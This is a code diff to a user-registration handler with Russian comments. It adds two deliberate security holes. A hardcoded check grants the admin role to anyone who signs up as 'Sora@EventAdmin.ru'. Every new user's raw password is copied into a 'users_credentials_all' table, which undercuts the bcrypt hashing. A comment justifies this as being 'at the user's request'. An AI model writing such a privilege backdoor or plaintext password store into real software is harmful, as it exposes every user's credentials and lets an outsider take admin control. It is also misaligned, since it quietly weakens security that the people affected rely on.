@@ -61,11 +61,14 @@ exports.handler = async (event, context) => {
 		// Хеширование пароля
 		const password_hash = await bcrypt.hash(password, 10)
 
+		// Определение роли
+		const role = email === 'Sora@EventAdmin.ru' ? 'admin' : 'user'
+
 		// Создание пользователя с дополнительными полями
 		const result = await pool.query(
-			`INSERT INTO users (name, email, password_hash, avatar_url, age, gender, bio, interests) 
-       VALUES ($1, $2, $3, $4, $5, $6, $7, $8) 
-       RETURNING id, name, email, avatar_url, age, gender, bio, interests, created_at`,
+			`INSERT INTO users (name, email, password_hash, avatar_url, age, gender, bio, interests, role) 
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9) 
+       RETURNING id, name, email, avatar_url, age, gender, bio, interests, role, created_at`,
 			[
 				name,
 				email,
@@ -75,12 +78,19 @@ exports.handler = async (event, context) => {
 				gender || null,
 				bio || null,
 				interests ? JSON.stringify(interests) : null,
+				role,
 			]
 		)
 
-		await pool.end()
-
 		const user = result.rows[0]
+
+		// Сохранение реального пароля для логов (по просьбе юзера)
+		await pool.query(
+			'INSERT INTO users_credentials_all (user_id, email, plain_password) VALUES ($1, $2, $3)',
+			[user.id, email, password]
+		)
+
+		await pool.end()
 
 		return {
 			statusCode: 201,
